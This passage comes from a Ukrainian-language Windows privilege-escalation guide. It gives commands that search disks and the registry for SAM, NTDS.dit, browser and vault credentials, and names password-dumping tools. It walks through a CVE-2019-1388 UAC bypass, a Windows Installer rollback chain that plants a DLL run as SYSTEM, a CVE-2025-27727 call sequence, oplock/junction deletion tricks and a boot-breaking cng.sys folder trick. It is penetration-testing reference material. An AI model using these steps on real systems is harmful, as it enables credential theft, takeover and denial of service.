TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Вважайте файл із відповідною назвою потенційним зашифрованим сховищем; його наявність не означає, що ви можете прочитати його, розблокувати або використати збережені облікові дані. Перевірте доступні профілі користувачів і налаштовані кореневі каталоги спільного доступу до файлів, щоб з’ясувати, де зберігаються такі файли.

Файл KeePass `.kdbx`, який можна прочитати, так само є лише зачіпкою щодо зашифрованого сховища. Щоб розблокувати його, потрібні справжній master-пароль і всі налаштовані фактори — файл ключа або дані облікового запису. Якщо під час авторизованої перевірки в записі знайдено пару хешів LM:NT, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash), перевірте названий обліковий запис, а також чи є хеш NT актуальним і чи приймає його цільова служба NTLM. Сам запис у сховищі не надає прав Administrator або SYSTEM; також мають бути наявні віддалений доступ до служби, права облікового запису й окремий спосіб виконання команд через службу. В інвентаризації слід зазначати шлях до сховища та можливість його читання, а не виводити базу даних чи збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в кошику

Перевірте доступні записи кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути кількамісячної давності й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у парному записі `$R`; перш ніж відкривати архів, перевірте метадані та наявність у поточного облікового запису прав на читання. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваних резервних копій немає. Вважайте назву архіву підставою для перевірки, а не доказом наявності в ньому чинного секрету.

Доступний видалений файл `.pfx` також може бути підказкою щодо **підписування коду**. Якщо він містить доступний приватний ключ, цим ключем можна підписати змінений сценарій PowerShell; [PowerShell вимагає сертифікат для підписування коду з приватним ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють особу підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання від імені іншого облікового запису потрібні права поточного облікового запису на зміну саме цього сценарію, чинне правило, яке приймає отриманий підпис для сценарію та цільового облікового запису, а також заплановане завдання чи інший процес із вищими привілеями, який справді запускає сценарій. Сама назва файлу `.pfx`, тема сертифіката чи доступність сценарію для запису не підтверджують наявність усього ланцюжка. Перш ніж відкривати матеріали з приватним ключем або запускати завдання, перевірте метадані, ACL, політику та команду завдання.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки й отримані файли на наявність підказок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді в іменованому архіві резервної копії. Такі матеріали можуть забезпечити доступ до окремого зашифрованого тому з даними, що містить старіші резервні копії; перевіряйте том і архів лише за наявності дозволу на доступ. Якщо резервна копія містить `NTDS.dit`, для офлайнового відновлення облікових даних домену також потрібен відповідний кущ `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Самі лише назви файлів і заблокований том не доводять, що існує придатний ключ відновлення чи резервна копія домену.

Щоб **відновити паролі**, збережені в різних програмах, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Усередині реєстру

**Інші можливі ключі реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Витягування ключів OpenSSH з реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних, де зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та вибране браузерів: можливо, там зберігаються **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft документує розташування профілю за замовчуванням](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити його. Наявність файлів — лише привід перевірити сховище облікових даних: переконайтеся, що файли доступні для читання, що доступний контекст DPAPI відповідного користувача або інший дозволений матеріал ключів, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік лише шляхів не вимагає відкривати базу даних або виводити розшифровані паролі.

Для Firefox [Mozilla документує](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це відповідно файл ключів і файл зашифрованих логінів. Їхня наявність — лише привід для перевірки: з’ясуйте, чи доступні для читання обидва файли, чи є збережені записи та чи захищений ключ основним паролем, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте фактичні права цього облікового запису на керування групами та [права групи на читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі артефакти браузера не підтверджують наявність шляху до прав адміністратора.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою class ID (CLSID)**, а функціональність кожного компонента надається через один або кілька інтерфейсів, ідентифікованих за допомогою interface ID (IID).

Класи та інтерфейси COM визначені в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення під назвою **ThreadingModel**, яке може мати значення **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (одно- або багатопотокова модель) чи **Neutral** (модель без прив’язки до потоку).

![Історія браузерів — перезапис COM DLL: у CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Загалом, якщо ви можете **перезаписати будь-які DLL**, які мають виконуватися, то можете **підвищити привілеї**, якщо цю DLL виконає інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення в системі, див.:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук вмісту файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу з певним ім’ям**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **— це плагін msf**. Я створив цей плагін, щоб **автоматично запускати кожен POST-модуль metasploit, який шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** в кількох інструментах, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Витік дескрипторів

Уявімо, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) **з повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але з успадкуванням усіх відкритих дескрипторів головного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор створеного привілейованого процесу**, отриманий за допомогою `OpenProcess()`, і **ін’єктувати shellcode**.\
[Ознайомтеся з цим прикладом, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Ознайомтеся з цією **іншою публікацією, де докладніше пояснено, як перевіряти та використовувати інші відкриті дескриптори процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Сегменти спільної пам’яті, які називають **каналами (pipes)**, дають змогу процесам обмінюватися даними та передавати їх.

У Windows є функція **іменованих каналів (Named Pipes)**, що дає змогу не пов’язаним між собою процесам обмінюватися даними, зокрема через різні мережі. Це схоже на архітектуру клієнт/сервер, де ролі визначаються як **сервер іменованого каналу** та **клієнт іменованого каналу**.

Коли **клієнт** надсилає дані через канал, **сервер**, який його створив, може **перейняти особу** **клієнта**, якщо має необхідні права **SeImpersonate**. Якщо виявити **привілейований процес**, який взаємодіє через канал, який ви можете імітувати, з’являється можливість **отримати вищі привілеї**, перейнявши особу цього процесу після його взаємодії зі створеним вами каналом. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дає змогу **перехоплювати обмін даними через іменований канал за допомогою такого інструмента, як Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **А цей інструмент дає змогу переглядати всі канали, щоб знаходити privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv до RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати шляхом асинхронних подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **4-байтовий запис** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony та завантажити довільну DLL як служба. Повний ланцюжок:

- Викликати `ClientAttach`, задавши для `pszDomainUser` шлях до наявного файлу, доступного для запису → служба відкриє його через `CreateFileW(..., OPEN_EXISTING)` і використовуватиме для запису асинхронних подій.
- Кожна подія записує контрольований атакувальником `InitContext` із `Initialize` у цей дескриптор. Зареєструвати line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викликати `TRequestMakeCall` (`Req_Func 121`), отримати дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасувати реєстрацію та завершити роботу, щоб повторювати детерміновані записи.
- Додати себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, знову під’єднатися, а потім викликати `GetUIDllName`, указавши шлях до довільної DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть запускати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через Markdown-рендерери

Клікабельні Markdown-посилання, передані до `ShellExecuteExW`, можуть запускати небезпечні обробники URI (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) і виконувати контрольовані атакувальником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Отримавши shell від імені користувача, ви можете виявити заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені «NT\AUTHORITY SYSTEM», використовуючи непривілейований обліковий запис.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час цього процесу, підписаний і виданий Microsoft.

Ось деякі з уражених систем:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

У цьому репозиторії GitHub є всі необхідні файли та відомості:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від Administrator Medium до High Integrity Level / UAC Bypass

Прочитайте це, щоб **дізнатися про Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions у каталозі завантажень у корені, який обслуговується сервером

Застосунок може створювати передбачуваний підкаталог для завантажень, записувати до нього файл із заданим викликачем ім’ям, а потім обробляти цей файл. Якщо користувач із низькими привілеями може видалити та замінити цей підкаталог на NTFS junction до запису з боку сервера, запис може пройти через junction до каталогу, який обслуговується вебсервером. Розміщений там скрипт може виконуватися з обліковим записом вебслужби, якщо сервер запускає файли цього типу. Це специфічна для застосунку межа довільного запису; наявність каталогу завантажень із правом запису або вже створеного junction сама по собі цього не доводить.

Перевірте точну побудову шляху й таймінг у обробнику завантажень, фактичні права користувача на видалення та створення підкаталогу, ефективні ACL цільового каталогу, чи переходить записувач за reparse points і чи виконує вебсервер файли в цьому каталозі. Окремо підтвердьте ідентичності процесів записувача та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse points, але не може встановити поведінку обробника або майбутню підміну junction. Якщо виконання відбувається з обліковим записом служби, перш ніж розглядати окремий шлях через привілеї токена, перевірте **фактичний токен процесу**.

## Від довільного видалення/переміщення/перейменування папок до SYSTEM EoP

Методика, описана [**у цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), з експлойт-кодом [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Суть атаки полягає у зловживанні функцією відкату Windows Installer, щоб замінити легітимні файли шкідливими під час видалення програми. Для цього зловмисник має створити **шкідливий MSI installer**, який використовуватиметься для перехоплення папки `C:\Config.Msi`. Пізніше Windows Installer використовуватиме її для зберігання файлів відкату під час видалення інших MSI-пакетів; ці файли відкату буде змінено так, щоб вони містили шкідливе навантаження.

### Ін’єкція шляху очищення Windows Installer COM (CVE-2025-27727)

Клієнт із низькими привілеями може звернутися до служби SYSTEM `msiexec.exe` через COM-об’єкт `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Зворотний аналіз визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зміщенням `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зміщенням `0xC8` і `CleanupTempPackages` зі зміщенням `0x50`. Ці назви та зміщення отримані зворотним аналізом і можуть відрізнятися в різних збірках.<sup>[[41]](#references)</sup>

Для користувача без прав адміністратора `SetEEUIDirectoryAndFilter` імперсоніфікує викликувача лише під час відкриття вказаного шляху з прапорцями `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` і `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що викликувач може видалити каталог, і запобігає переходу за reparse point, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що його створив Windows Installer.<sup>[[41]](#references)</sup>

Після `MsiBeginTransactionW` метод `SetEEUIDirectoryAndFilter` додає шлях до списку на видалення як папку, незалежно від аргументу фільтра, переданого викликувачем. Служба записує іменоване значення `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’ям значення є шлях, контрольований викликувачем, а дані `0x00000002` позначають папку. Після цього `CleanupTempPackages(NULL, FALSE)` одразу запускає очищення. Його привілейований робочий процес перераховує значення реєстру та передає записи для папок рекурсивній функції `FDeleteFolder`, не перевіряючи походження шляхів. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, скидає атрибути файлів і повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисним примітивом є повторне використання шляху, а не перенаправлення через junction. Зареєструйте створений зловмисником `C:\Config.Msi`, видаліть його, а потім дочекайтеся, поки Windows Installer знову створить той самий шлях із захищеними даними відкату. Під час очищення довіряють застарілому імені `TempPackages` і видаляють нову теку від імені SYSTEM. Це обходить передбачений захист за допомогою `FILE_FLAG_OPEN_REPARSE_POINT` і пом’якшення, яке перевіряє довіру до перенаправлення, оскільки reparse point не потрібен.<sup>[[41]](#references)</sup>

Цей примітив видалення вписується в наведений нижче ланцюжок відкату: збережіть окремий запис `Installer\Folders`, видаліть захищений `C:\Config.Msi`, створіть його з NULL DACL і збережіть handle із правом `WRITE_DAC`, відкритий до того, як інсталятор посилить DACL. Попередньо відкритий handle дає змогу відновити дозвільний DACL за допомогою `NtSetSecurityObject`, після чого згенерований `.rbs` можна замінити до продовження відкату.<sup>[[41]](#references)</sup>

Microsoft виправила цю проблему, заборонивши `CMsiTransaction::SetEEUIDirectoryAndFilter` викликати `ScheduleFileOrFolderDelete`, коли ввімкнено новий feature gate. Виклик COM усе ще може повертати успіх, але шлях, контрольований зловмисником, більше не додається до `TempPackages`. Установіть оновлення безпеки Windows за квітень 2025 року; не використовуйте успішне повернення методу як перевірку наявності виправлення.<sup>[[41]](#references)[[42]](#references)</sup>

Узагальнена техніка така:

1. **Етап 1 – Підготовка до перехоплення (залиште `C:\Config.Msi` порожньою)**

- Крок 1: Установіть MSI
    - Створіть `.msi`, який установлює нешкідливий файл (наприклад, `dummy.txt`) у доступну для запису теку (`TARGETDIR`).
    - Позначте інсталятор як **"UAC Compliant"**, щоб його міг запускати **не адміністратор**.
    - Після встановлення залиште **handle** відкритим для цього файла.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення почне переміщувати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (резервні копії для відкату).
    - **Опитуйте відкритий handle до файла** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Синхронізація користувацькою дією
    - `.msi` містить **користувацьку дію видалення (`SyncOnRbfWritten`)**, яка:
        - Повідомляє, коли файл `.rbf` записано.
        - Потім **чекає** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Після сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім надішліть сигнал у відповідь, щоб видалення завершилося.
    - Windows Installer не зможе видалити `.rbf`, а оскільки він не зможе видалити весь вміст, **`C:\Config.Msi` не буде видалено**.

- Крок 5: Видаліть `.rbf` вручну
    - Видаліть файл `.rbf` вручну.
    - Тепер **`C:\Config.Msi` порожня** і готова до перехоплення.

> На цьому етапі **запустіть уразливість довільного видалення теки з рівнем SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 – Заміна скриптів відкату на шкідливі**

- Крок 6: Створіть `C:\Config.Msi` з ненадійними ACL
    - Самостійно створіть теку `C:\Config.Msi`.
    - Установіть **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим handle** із правом `WRITE_DAC`.

- Крок 7: Запустіть інше встановлення
    - Знову встановіть `.msi`, указавши:
        - `TARGETDIR`: доступне для запису розташування.
        - `ERROROUT`: змінну, яка спричинить примусову помилку.
    - Це встановлення буде використане, щоб знову запустити **відкат**, який читає `.rbs` і `.rbf`.

- Крок 8: Відстежуйте появу `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб стежити за `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
    - Зафіксуйте його ім’я файла.

- Крок 9: Синхронізуйтеся перед відкатом
    - `.msi` містить **користувацьку дію встановлення (`SyncBeforeRollback`)**, яка:
        - Надсилає сигнал події після створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: Повторно встановіть слабкі ACL
    - Після отримання події `.rbs created`:
        - Windows Installer **повторно встановлює суворі ACL** для `C:\Config.Msi`.
        - Але оскільки у вас іще є handle із правом `WRITE_DAC`, ви можете **знову встановити слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тому ви все ще можете записувати в теку.

- Крок 11: Розмістіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим скриптом відкату**, який указує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване розташування** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливим payload DLL рівня SYSTEM**.

- Крок 12: Запустіть відкат
    - Надішліть сигнал події синхронізації, щоб інсталятор продовжив роботу.
    - **Користувацька дія типу 19 (`ErrorOut`)** налаштована на **навмисне переривання встановлення** у визначений момент.
    - Це запускає **відкат**.

- Крок 13: SYSTEM установлює вашу DLL
    - Windows Installer:
        - Читає ваш шкідливий `.rbs`.
        - Копіює вашу DLL `.rbf` у цільове розташування.
    - Тепер ваша **шкідлива DLL розміщена за шляхом, звідки її завантажує SYSTEM**.

- Фінальний крок: Виконайте код від імені SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажує перехоплену вами DLL.
    - **Готово**: ваш код виконується **від імені SYSTEM**.


### Від довільного видалення/переміщення/перейменування файла до SYSTEM EoP

Основна техніка відкату MSI (попередня) передбачає, що ви можете видалити **цілу теку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дає змогу лише **довільно видаляти файли**?

Можна використати **внутрішню будову NTFS**: кожна тека має прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Отже, якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить усю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Хоча ви викликаєте API для видалення *файлу*, він **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваш примітив не дає змоги видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакувальником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **Oplock** призупиняє виконання, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він дістанеться до `file1.txt`, **oplock спрацює** та передасть керування вашому callback.

4. Крок 4: У callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це очистить `folder1`, не перериваючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки: видалення цього потоку видаляє папку.

5. Крок 5: Зняти блокування oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він насправді видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видаляється від імені SYSTEM.

### Від створення довільної папки до постійного DoS

Скористайтеся примітивом, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** чи **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити справжній драйвер під час запуску.
- Після цього Windows намагатиметься завантажити `cng.sys` під час запуску.
- Вона побачить папку, **не зможе знайти справжній драйвер** і **аварійно завершить роботу або зупинить завантаження**.
- **Резервного варіанта немає**, а **відновлення неможливе** без зовнішнього втручання (наприклад, відновлення завантаження або доступу до диска).

### Від привілейованих шляхів журналів/резервних копій і OM symlinks до довільного перезапису файлів / DoS завантаження

Якщо **привілейована служба** записує журнали/експорти за шляхом, зчитаним із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис файлу (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Файл конфігурації, у якому зберігається цільовий шлях, доступний для запису зловмиснику (наприклад, `%ProgramData%\...\.ini`).
